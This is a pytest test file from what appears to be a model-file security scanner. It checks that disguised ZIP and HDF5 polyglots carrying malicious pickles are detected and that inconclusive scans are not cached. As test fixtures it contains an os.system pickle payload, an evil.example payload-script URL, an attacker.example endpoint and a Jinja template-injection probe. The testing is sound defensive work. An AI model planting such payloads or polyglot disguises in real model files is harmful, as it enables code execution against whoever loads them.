    assert result.scanner_name == "flax_msgpack"
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "flax_msgpack_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_ambiguous_renamed_msgpack_result_is_not_cached(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "ambiguous.jpg"
    large_metadata: dict[str, object] = {f"field{i}": i for i in range(2100)}
    large_metadata["blob"] = "x" * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 100)
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb(
            {"metadata": large_metadata, "state": {"selected": True}},
            use_bin_type=True,
        )
    )
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        first = scan_file(str(checkpoint), config=config)
        second = scan_file(str(checkpoint), config=config)

        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_missing_msgpack_result_is_not_cached(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    checkpoint = tmp_path / "model.flax"
    checkpoint.write_bytes(b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }
    monkeypatch.setattr(flax_msgpack_scanner, "HAS_MSGPACK", False)

    reset_cache_manager()
    try:
        first = scan_file(str(checkpoint), config=config)
        second = scan_file(str(checkpoint), config=config)

        assert first.success is False
        assert second.success is False
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_missing_yaml_parser_result_is_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_dir = tmp_path / "model"
    model_dir.mkdir()
    yaml_file = model_dir / "config.yaml"
    yaml_file.write_text("model: safe\n", encoding="utf-8")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }
    monkeypatch.setattr(jinja2_template_scanner, "HAS_YAML", False)

    reset_cache_manager()
    try:
        first = scan_file(str(yaml_file), config=config)
        second = scan_file(str(yaml_file), config=config)

        assert first.scanner_name == "jinja2_template"
        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_oversized_standalone_jinja_result_is_not_cached(tmp_path: Path) -> None:
    template_file = tmp_path / "large.jinja"
    template_file.write_text("{{ content }}" * 10000, encoding="utf-8")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        first = scan_file(str(template_file), config=config)
        second = scan_file(str(template_file), config=config)

        assert first.scanner_name == "jinja2_template"
        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_jinja_sandbox_budget_result_is_not_cached(tmp_path: Path) -> None:
    pytest.importorskip("jinja2.sandbox")
    template_file = tmp_path / "amplify.jinja"
    template_file.write_text("{{ 'A' * 1000000 }}", encoding="utf-8")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
        "sandbox_render_max_output_chars": 16,
        "sandbox_render_timeout_seconds": 2,
    }

    reset_cache_manager()
    try:
        first = scan_file(str(template_file), config=config)
        second = scan_file(str(template_file), config=config)

        assert first.scanner_name == "jinja2_template"
        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert "jinja2_sandbox_render_budget_exceeded" in first.metadata["scan_outcome_reasons"]
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    aggregate = scan_model_directory_or_file(
        str(template_file),
        config={
            "cache_scan_results": False,
            "sandbox_render_max_output_chars": 16,
            "sandbox_render_timeout_seconds": 2,
        },
    )
    assert determine_exit_code(aggregate) == 2


def test_scan_file_unreadable_standalone_jinja_result_is_not_cached(tmp_path: Path) -> None:
    template_file = tmp_path / "invalid.jinja"
    template_file.write_bytes(b"{{ cycler.__init__.__globals__ }}\xff")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        first = scan_file(str(template_file), config=config)
        second = scan_file(str(template_file), config=config)

        assert first.scanner_name == "jinja2_template"
        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_still_routes_malicious_zip_with_local_header(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "payload.bin"
    _create_misnamed_zip(disguised_zip, {"payload.pkl": _build_malicious_pickle()})

    assert disguised_zip.read_bytes().startswith(b"PK\x03\x04")

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_file_prefers_hdf5_and_preserves_malicious_zip_userblock(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    polyglot = tmp_path / "zip-userblock.h5"
    _create_misnamed_zip(polyglot, {"payload.pkl": _build_malicious_pickle()})
    signature_offset = _append_hdf5_userblock_candidate(polyglot, plausible=True)
    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.HAS_H5PY", False)

    assert file_detection.detect_file_format(str(polyglot)) == "zip"
    assert find_hdf5_signature_offset(str(polyglot)) == signature_offset

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    assert result.scanner_name == "keras_h5"
    assert result.success is False
    assert "keras_h5_h5py_unavailable" in result.metadata["scan_outcome_reasons"]
    assert any(check.name == "H5PY Library Check" for check in result.checks)
    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_file_prefers_hdf5_and_preserves_executable_zip_userblock(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    polyglot = tmp_path / "executable-zip-userblock.h5"
    _create_misnamed_zip(
        polyglot,
        {
            "data.pkl": _build_malicious_pickle(),
            "version": b"1.6",
            "schema.json": _build_malicious_skops_schema(),
        },
    )
    _prepend_stub(polyglot, _valid_elf64_header())
    signature_offset = _append_hdf5_userblock_candidate(polyglot, plausible=True)
    cache_dir = tmp_path / "executable-zip-cache"
    config = {"cache_enabled": True, "cache_dir": str(cache_dir), "min_cache_file_size": 0}
    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.HAS_H5PY", False)

    assert file_detection.detect_file_format(str(polyglot)) == EXECUTABLE_ZIP_POLYGLOT_FORMAT
    assert find_hdf5_signature_offset(str(polyglot)) == signature_offset

    reset_cache_manager()
    try:
        for _ in range(2):
            result = scan_file(str(polyglot), config=config)
            assert result.scanner_name == "keras_h5"
            assert result.success is False
            assert "keras_h5_h5py_unavailable" in result.metadata["scan_outcome_reasons"]
            _assert_system_pickle_detected(result, "data.pkl")
            assert any(
                check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED
                for check in result.checks
            )

        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_preserves_large_zip_userblock_outside_eocd_tail_window(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    polyglot = tmp_path / "large-zip-userblock.h5"
    _create_misnamed_zip(
        polyglot,
        {
            "data.pkl": _build_malicious_pickle(),
            "version": b"1.6",
            "schema.json": _build_malicious_skops_schema(),
        },
    )
    signature_offset = _append_hdf5_userblock_candidate(
        polyglot,
        plausible=True,
        minimum_signature_offset=128 * 1024,
    )
    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.HAS_H5PY", False)

    assert zipfile.is_zipfile(polyglot) is False
    assert find_hdf5_signature_offset(str(polyglot)) == signature_offset

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    assert result.scanner_name == "keras_h5"
    assert "keras_h5_h5py_unavailable" in result.metadata["scan_outcome_reasons"]
    _assert_system_pickle_detected(result, "data.pkl")
    assert any(check.name == "CVE-2025-54412 Detection" for check in result.checks)
    pickle_issue = next(issue for issue in result.issues if issue.rule_code == "S201")
    assert str(polyglot) in (pickle_issue.location or "")


def test_scan_file_preserves_padded_zip_inside_hdf5_userblock(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    polyglot = tmp_path / "padded-zip-userblock.h5"
    _create_misnamed_zip(polyglot, {"payload.pkl": _build_malicious_pickle()})
    _prepend_stub(polyglot, bytes(128))
    signature_offset = _append_hdf5_userblock_candidate(
        polyglot,
        plausible=True,
        minimum_signature_offset=128 * 1024,
    )
    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.HAS_H5PY", False)

    assert zipfile.is_zipfile(polyglot) is False
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "unknown"
    assert find_hdf5_signature_offset(str(polyglot)) == signature_offset

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_file_fails_closed_when_hdf5_userblock_zip_probe_is_bounded(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "large-userblock.h5"
    model_path.write_bytes(b"")
    signature_offset = _append_hdf5_userblock_candidate(
        model_path,
        plausible=True,
        minimum_signature_offset=16 * 1024 * 1024,
    )
    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.HAS_H5PY", False)

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.success is False
    assert "hdf5_userblock_zip_probe_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "HDF5 User Block ZIP Probe"
        and check.details["hdf5_signature_offset"] == signature_offset
        and check.details["zip_probe_bytes_scanned"] == HDF5_SIGNATURE_SCAN_MAX_BYTES
        for check in result.checks
    )


def test_scan_file_honors_zip_only_selection_for_hdf5_userblock(tmp_path: Path) -> None:
    polyglot = tmp_path / "selected-zip-userblock.h5"
    _create_misnamed_zip(polyglot, {"payload.pkl": _build_malicious_pickle()})
    _append_hdf5_userblock_candidate(polyglot, plausible=True)

    result = scan_file(
        str(polyglot),
        config={"scanners": ["zip"], "cache_scan_results": False},
    )

    assert result.scanner_name == "zip"
    assert any(check.name == "ZIP Aggregate Size Limit Check" for check in result.checks)
    assert result.metadata["contents"] == [
        {
            "path": f"{polyglot}:payload.pkl",
            "type": "scanner_selection",
            "size": len(_build_malicious_pickle()),
        }
    ]
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "keras_h5"
        for check in result.checks
    )


def test_scan_file_honors_pytorch_zip_only_selection_for_hdf5_userblock(tmp_path: Path) -> None:
    polyglot = tmp_path / "selected-pytorch-zip-userblock.h5"
    _create_misnamed_zip(
        polyglot,
        {
            "archive/data.pkl": pickle.dumps(
                {"endpoint": "http://attacker.example/model"},
                protocol=4,
            ),
            "archive/version": b"3\n",
            "archive/byteorder": b"little",
        },
    )
    _append_hdf5_userblock_candidate(polyglot, plausible=True)

    result = scan_file(
        str(polyglot),
        config={"scanners": ["pytorch_zip"], "cache_scan_results": False},
    )

    assert any(
        check.name == "Network Communication Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{polyglot}:archive/data.pkl"
        for check in result.checks
    )
    assert not any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "pytorch_zip"
        for check in result.checks
    )


def test_scan_file_selected_weight_distribution_ignores_hdf5_userblock_zip_near_match(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "selected-weight-distribution-userblock.h5"
    model_path.write_bytes(b"PK\x03\x04 benign model notes")
    _append_hdf5_userblock_candidate(model_path, plausible=True)

    def fake_weight_scan(_self: Any, path: str) -> ScanResult:
        assert path == str(model_path)
        result = ScanResult(scanner_name="weight_distribution")
        result.finish(success=True)
        return result

    monkeypatch.setattr(
        "modelaudit.scanners.weight_distribution_scanner.WeightDistributionScanner.scan",
        fake_weight_scan,
    )
    _mock_weight_distribution_scanner_availability(monkeypatch)

    result = scan_file(
        str(model_path),
        config={"scanners": ["weight_distribution"], "cache_scan_results": False},
    )

    assert result.scanner_name == "weight_distribution"
    assert result.success is True
    assert not any(check.name == "HDF5 User Block ZIP Analysis" for check in result.checks)


def test_scan_file_honors_zip_only_selection_for_large_hdf5_userblock(tmp_path: Path) -> None:
    polyglot = tmp_path / "selected-large-zip-userblock.h5"
    _create_misnamed_zip(polyglot, {"payload.pkl": _build_malicious_pickle()})
    _append_hdf5_userblock_candidate(polyglot, plausible=True, minimum_signature_offset=128 * 1024)

    assert zipfile.is_zipfile(polyglot) is False

    result = scan_file(
        str(polyglot),
        config={"scanners": ["zip"], "cache_scan_results": False},
    )

    assert result.scanner_name == "zip"
    assert any(check.name == "ZIP Aggregate Size Limit Check" for check in result.checks)
    assert result.metadata["contents"] == [
        {
            "path": f"{polyglot}:payload.pkl",
            "type": "scanner_selection",
            "size": len(_build_malicious_pickle()),
        }
    ]
    assert "hdf5_userblock_zip_scan_failed" not in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_honors_keras_only_selection_for_hdf5_zip_userblock(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    polyglot = tmp_path / "selected-keras-userblock.h5"
    _create_misnamed_zip(polyglot, {"payload.pkl": _build_malicious_pickle()})
    _append_hdf5_userblock_candidate(polyglot, plausible=True)
    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.HAS_H5PY", False)

    result = scan_file(
        str(polyglot),
        config={"scanners": ["keras_h5"], "cache_scan_results": False},
    )

    assert result.scanner_name == "keras_h5"
    assert not any(issue.rule_code == "S201" for issue in result.issues)
    assert any(
        check.name == "Scanner Selection"
        and check.details.get("skipped_scanner_id") == "zip"
        and check.details.get("context") == "HDF5 user-block content analysis"
        for check in result.checks
    )


def test_scan_file_does_not_report_zip_skip_for_benign_hdf5_userblock(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "selected-benign-userblock.h5"
    model_path.write_bytes(b"benign user block")
    _append_hdf5_userblock_candidate(model_path, plausible=True)
    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.HAS_H5PY", False)

    result = scan_file(
        str(model_path),
        config={"scanners": ["keras_h5"], "cache_scan_results": False},
    )

    assert result.scanner_name == "keras_h5"
    assert not any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "zip"
        for check in result.checks
    )


@pytest.mark.parametrize(
    "zip_signature",
    [b"PK\x03\x04", b"PK\x01\x02", b"PK\x06\x06", b"PK\x06\x07", b"PK\x07\x08"],
    ids=["local-header", "central-directory", "zip64-eocd", "zip64-locator", "data-descriptor"],
)
def test_scan_file_fails_closed_for_corrupt_hdf5_userblock_zip(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    zip_signature: bytes,
) -> None:
    polyglot = tmp_path / "corrupt-zip-userblock.h5"
    polyglot.write_bytes(zip_signature + bytes(64))
    signature_offset = _append_hdf5_userblock_candidate(polyglot, plausible=True)
    assert file_detection.detect_file_format_from_magic(str(polyglot)) == "zip"
    supplemental_result = ScanResult(scanner_name="keras_h5")
    supplemental_result.finish(success=True)

    archive_dispatch.merge_hdf5_userblock_zip_findings(
        str(polyglot),
        supplemental_result,
        {"cache_scan_results": False},
        signature_offset,
        context="test HDF5 user block",
    )

    assert supplemental_result.success is False
    assert "hdf5_userblock_zip_scan_failed" in supplemental_result.metadata["scan_outcome_reasons"]
    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.HAS_H5PY", False)

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    assert result.scanner_name == "keras_h5"
    assert result.success is False
    assert "hdf5_userblock_zip_scan_failed" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "HDF5 User Block ZIP Analysis"
        and check.status == CheckStatus.FAILED
        and "without a valid ZIP end record" in check.message
        for check in result.checks
    )
    aggregate = scan_model_directory_or_file(str(polyglot), config={"cache_scan_results": False})
    assert determine_exit_code(aggregate) == 2


@pytest.mark.parametrize(
    "zip_marker",
    [b"PK\x06\x06", b"PK\x06\x07", b"PK\x07\x08"],
    ids=["zip64-eocd", "zip64-locator", "data-descriptor"],
)
def test_scan_file_preserves_benign_nonleading_zip_marker_in_hdf5_userblock(
    tmp_path: Path,
    zip_marker: bytes,
) -> None:
    model_path = tmp_path / "benign-userblock-marker.h5"
    model_path.write_bytes(b"benign user block data " + zip_marker + bytes(64))
    signature_offset = _append_hdf5_userblock_candidate(model_path, plausible=True)
    result = ScanResult(scanner_name="keras_h5")
    result.finish(success=True)

    archive_dispatch.merge_hdf5_userblock_zip_findings(
        str(model_path),
        result,
        {"cache_scan_results": False},
        signature_offset,
        context="test HDF5 user block",
    )

    assert result.success is True
    assert "hdf5_userblock_zip_scan_failed" not in result.metadata.get("scan_outcome_reasons", [])


@pytest.mark.parametrize(
    ("minimum_signature_offset", "whole_file_is_zip"),
    [(512, True), (128 * 1024, False)],
)
def test_scan_file_fails_closed_for_content_after_hdf5_userblock_zip(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    minimum_signature_offset: int,
    whole_file_is_zip: bool,
) -> None:
    polyglot = tmp_path / "trailing-userblock-content.h5"
    _create_misnamed_zip(polyglot, {"README.txt": b"benign archive"})
    with polyglot.open("ab") as handle:
        handle.write(b'cos\nsystem\n(S"echo pwned"\ntR.')
    signature_offset = _append_hdf5_userblock_candidate(
        polyglot,
        plausible=True,
        minimum_signature_offset=minimum_signature_offset,
    )
    assert zipfile.is_zipfile(polyglot) is whole_file_is_zip
    supplemental_result = ScanResult(scanner_name="keras_h5")
    supplemental_result.finish(success=True)

    archive_dispatch.merge_hdf5_userblock_zip_findings(
        str(polyglot),
        supplemental_result,
        {"cache_scan_results": False},
        signature_offset,
        context="test HDF5 user block",
    )

    assert supplemental_result.success is False
    assert "hdf5_userblock_zip_trailing_content_unanalyzed" in supplemental_result.metadata["scan_outcome_reasons"]
    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.HAS_H5PY", False)

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    assert result.success is False
    assert "hdf5_userblock_zip_trailing_content_unanalyzed" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "HDF5 User Block Trailing Content"
        and check.status == CheckStatus.FAILED
        and check.details["zip_logical_end"] < check.details["hdf5_signature_offset"]
        for check in result.checks
    )
    aggregate = scan_model_directory_or_file(str(polyglot), config={"cache_scan_results": False})
    assert determine_exit_code(aggregate) == 2


@pytest.mark.parametrize(
    ("minimum_signature_offset", "whole_file_is_zip"),
    [(512, True), (128 * 1024, False)],
)
def test_scan_file_preserves_earlier_concatenated_hdf5_userblock_zip(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    minimum_signature_offset: int,
    whole_file_is_zip: bool,
) -> None:
    malicious_zip = tmp_path / "malicious-first.zip"
    benign_zip = tmp_path / "benign-last.zip"
    _create_misnamed_zip(malicious_zip, {"payload.pkl": _build_malicious_pickle()})
    _create_misnamed_zip(benign_zip, {"README.txt": b"benign trailing archive"})
    polyglot = tmp_path / "concatenated-zip-userblock.h5"
    polyglot.write_bytes(malicious_zip.read_bytes() + benign_zip.read_bytes())
    _append_hdf5_userblock_candidate(
        polyglot,
        plausible=True,
        minimum_signature_offset=minimum_signature_offset,
    )
    assert zipfile.is_zipfile(polyglot) is whole_file_is_zip
    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.HAS_H5PY", False)

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    _assert_system_pickle_detected(result, "payload.pkl")
    assert any(item.get("path") == f"{polyglot}:README.txt" for item in result.metadata["contents"])


@pytest.mark.parametrize("trailing_zip64", [False, True])
def test_hdf5_userblock_allows_zero_padding_between_concatenated_zip_segments(
    tmp_path: Path,
    trailing_zip64: bool,
) -> None:
    malicious_zip = tmp_path / "malicious-first.zip"
    benign_zip = tmp_path / "benign-last.zip"
    _create_misnamed_zip(malicious_zip, {"payload.pkl": _build_malicious_pickle()})
    _create_misnamed_zip(benign_zip, {"README.txt": b"benign trailing archive"})
    if trailing_zip64:
        _promote_small_zip_to_zip64(benign_zip)

    polyglot = tmp_path / "padded-concatenated-zip-userblock.h5"
    polyglot.write_bytes(malicious_zip.read_bytes() + bytes(64) + benign_zip.read_bytes())
    signature_offset = _append_hdf5_userblock_candidate(polyglot, plausible=True)
    result = ScanResult(scanner_name="keras_h5")
    result.finish(success=True)

    archive_dispatch.merge_hdf5_userblock_zip_findings(
        str(polyglot),
        result,
        {"cache_scan_results": False},
        signature_offset,
        context="test HDF5 user block",
    )

    _assert_system_pickle_detected(result, "payload.pkl")
    assert any(item.get("path") == f"{polyglot}:README.txt" for item in result.metadata["contents"])
    assert "hdf5_userblock_zip_scan_failed" not in result.metadata.get("scan_outcome_reasons", [])
    assert not any(check.name == "HDF5 User Block ZIP Analysis" for check in result.checks)


@pytest.mark.parametrize("trailing_zip64", [False, True])
def test_scan_file_fails_closed_for_non_padding_between_concatenated_hdf5_userblock_zips(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    trailing_zip64: bool,
) -> None:
    first_zip = tmp_path / "benign-first.zip"
    trailing_zip = tmp_path / "benign-last.zip"
    _create_misnamed_zip(first_zip, {"README-first.txt": b"benign first archive"})
    _create_misnamed_zip(trailing_zip, {"README-last.txt": b"benign trailing archive"})
    if trailing_zip64:
        _promote_small_zip_to_zip64(trailing_zip)

    polyglot = tmp_path / "non-padding-concatenated-zip-userblock.h5"
    polyglot.write_bytes(first_zip.read_bytes() + _build_malicious_pickle() + trailing_zip.read_bytes())
    _append_hdf5_userblock_candidate(polyglot, plausible=True)
    cache_dir = tmp_path / "non-padding-concatenated-cache"
    config = {"cache_enabled": True, "cache_dir": str(cache_dir), "min_cache_file_size": 0}
    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.HAS_H5PY", False)

    reset_cache_manager()
    try:
        for _ in range(2):
            result = scan_file(str(polyglot), config=config)

            assert result.success is False
            assert "hdf5_userblock_zip_scan_failed" in result.metadata["scan_outcome_reasons"]
            assert any(
                check.name == "HDF5 User Block ZIP Analysis"
                and check.status == CheckStatus.FAILED
                and "non-padding content between ZIP segments" in check.message
                for check in result.checks
            )
        cache_stats = get_cache_manager(str(cache_dir), enabled=True).get_stats()
        assert cache_stats["cache_hits"] == 0
        assert cache_stats["total_entries"] == 0

        aggregate = scan_model_directory_or_file(str(polyglot), config={"cache_scan_results": False})
        metadata = aggregate.file_metadata[str(polyglot)]
        assert "hdf5_userblock_zip_scan_failed" in metadata["scan_outcome_reasons"]
        assert determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


@pytest.mark.parametrize("malicious", [False, True])
@pytest.mark.parametrize("nested_zip64", [False, True])
def test_hdf5_userblock_outer_zip_preserves_entries_before_nested_end_record(
    tmp_path: Path,
    malicious: bool,
    nested_zip64: bool,
) -> None:
    nested_zip = tmp_path / "nested.zip"
    _create_misnamed_zip(nested_zip, {"README-nested.txt": b"benign nested archive"})
    if nested_zip64:
        _promote_small_zip_to_zip64(nested_zip)
        nested_bytes = nested_zip.read_bytes()
        nested_eocd_offset = nested_bytes.rfind(b"PK\x05\x06")
        assert nested_bytes[nested_eocd_offset + 12 : nested_eocd_offset + 20] == b"\xff" * 8
    with zipfile.ZipFile(nested_zip) as archive:
        assert archive.namelist() == ["README-nested.txt"]

    polyglot = tmp_path / "outer-nested-zip-userblock.h5"
    with zipfile.ZipFile(polyglot, "w", compression=zipfile.ZIP_STORED) as archive:
        if malicious:
            archive.writestr("payload.pkl", _build_malicious_pickle())
        else:
            archive.writestr("README-outer.txt", b"benign outer archive")
        archive.writestr("nested.bin", nested_zip.read_bytes())
    signature_offset = _append_hdf5_userblock_candidate(polyglot, plausible=True)
    result = ScanResult(scanner_name="keras_h5")
    result.finish(success=True)

    archive_dispatch.merge_hdf5_userblock_zip_findings(
        str(polyglot),
        result,
        {"cache_scan_results": False},
        signature_offset,
        context="test HDF5 user block",
    )

    pickle_findings = [
        issue
        for issue in result.issues
        if issue.rule_code == "S201"
        and issue.details.get("zip_entry") == "payload.pkl"
        and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
    ]
    assert bool(pickle_findings) is malicious
    assert not any(check.name == "HDF5 User Block ZIP Analysis" for check in result.checks)
    assert (
        bool([issue for issue in result.issues if issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL)])
        is malicious
    )


def test_hdf5_userblock_concatenated_outer_zip_ignores_nested_zip64_boundary(tmp_path: Path) -> None:
    first_zip = tmp_path / "first.zip"
    _create_misnamed_zip(first_zip, {"README-first.txt": b"benign first archive"})
    nested_zip = tmp_path / "nested.zip"
    _create_misnamed_zip(nested_zip, {"README-nested.txt": b"benign nested archive"})
    _promote_small_zip_to_zip64(nested_zip)
    outer_zip = tmp_path / "outer.zip"
    with zipfile.ZipFile(outer_zip, "w", compression=zipfile.ZIP_STORED) as archive:
        archive.writestr("payload.pkl", _build_malicious_pickle())
        archive.writestr("nested.bin", nested_zip.read_bytes())

    polyglot = tmp_path / "concatenated-nested-zip64-userblock.h5"
    polyglot.write_bytes(first_zip.read_bytes() + outer_zip.read_bytes())
    signature_offset = _append_hdf5_userblock_candidate(polyglot, plausible=True, minimum_signature_offset=2048)
    result = ScanResult(scanner_name="keras_h5")
    result.finish(success=True)

    archive_dispatch.merge_hdf5_userblock_zip_findings(
        str(polyglot),
        result,
        {"cache_scan_results": False},
        signature_offset,
        context="test HDF5 user block",
    )

    _assert_system_pickle_detected(result, "payload.pkl")
    assert not any(check.name == "HDF5 User Block ZIP Analysis" for check in result.checks)


def test_large_hdf5_userblock_copies_only_validated_zip_prefix(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    polyglot = tmp_path / "bounded-copy-userblock.h5"
    _create_misnamed_zip(polyglot, {"README.txt": b"benign archive"})
    logical_zip_size = polyglot.stat().st_size
    signature_offset = _append_hdf5_userblock_candidate(
        polyglot,
        plausible=True,
        minimum_signature_offset=4 * 1024 * 1024,
    )
    copied_lengths: list[int] = []
    original_copy = archive_dispatch._copy_file_prefix_to_temp

    def track_copy(path: str, length: int, suffix: str) -> str:
        copied_lengths.append(length)
        return original_copy(path, length, suffix)

    monkeypatch.setattr(archive_dispatch, "_copy_file_prefix_to_temp", track_copy)
    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.HAS_H5PY", False)

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    assert result.scanner_name == "keras_h5"
    assert copied_lengths == [logical_zip_size]
    assert copied_lengths[0] < signature_offset


@pytest.mark.parametrize(
    ("prefix", "expected_s309"),
    [
        (b"dependency_url=https://evil.example/payload.sh\n", True),
        (b"package==1.2.3\n", False),
    ],
)
def test_scan_file_preserves_text_analysis_for_hdf5_requirements_userblock(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    prefix: bytes,
    expected_s309: bool,
) -> None:
    requirements = tmp_path / "requirements.txt"
    requirements.write_bytes(prefix)
    _append_hdf5_userblock_candidate(requirements, plausible=True)
    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.HAS_H5PY", False)

    result = scan_file(str(requirements), config={"cache_scan_results": False})

    assert result.scanner_name == "keras_h5"
    assert result.metadata["supplemental_scanners"] == ["text"]
    assert any(issue.rule_code == "S309" for issue in result.issues) is expected_s309


def test_scan_file_does_not_use_suffix_only_supplemental_scanner_for_hdf5_userblock(tmp_path: Path) -> None:
    h5py = pytest.importorskip("h5py")
    model_path = tmp_path / "model.pkl"
    with h5py.File(model_path, "w", userblock_size=512) as h5_file:
        h5_file.attrs["model_config"] = json.dumps({"class_name": "Sequential", "config": {"layers": []}})

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "keras_h5"
    assert result.success is True
    assert "supplemental_scanners" not in result.metadata
    assert all(check.name != "Format Validation" for check in result.checks)


def test_scan_file_routes_runtime_h5py_failure_for_extensionless_userblock(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    h5py = pytest.importorskip("h5py")
    model_path = tmp_path / "runtime-failure-userblock"
    with h5py.File(model_path, "w", userblock_size=512) as h5_file:
        h5_file.attrs["model_config"] = json.dumps({"class_name": "Sequential", "config": {"layers": []}})

    def fail_h5py_open(*_args: Any, **_kwargs: Any) -> None:
        raise RuntimeError("simulated h5py runtime failure")

    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.h5py.File", fail_h5py_open)

    audit_result = scan_model_directory_or_file(str(model_path), cache_enabled=False)
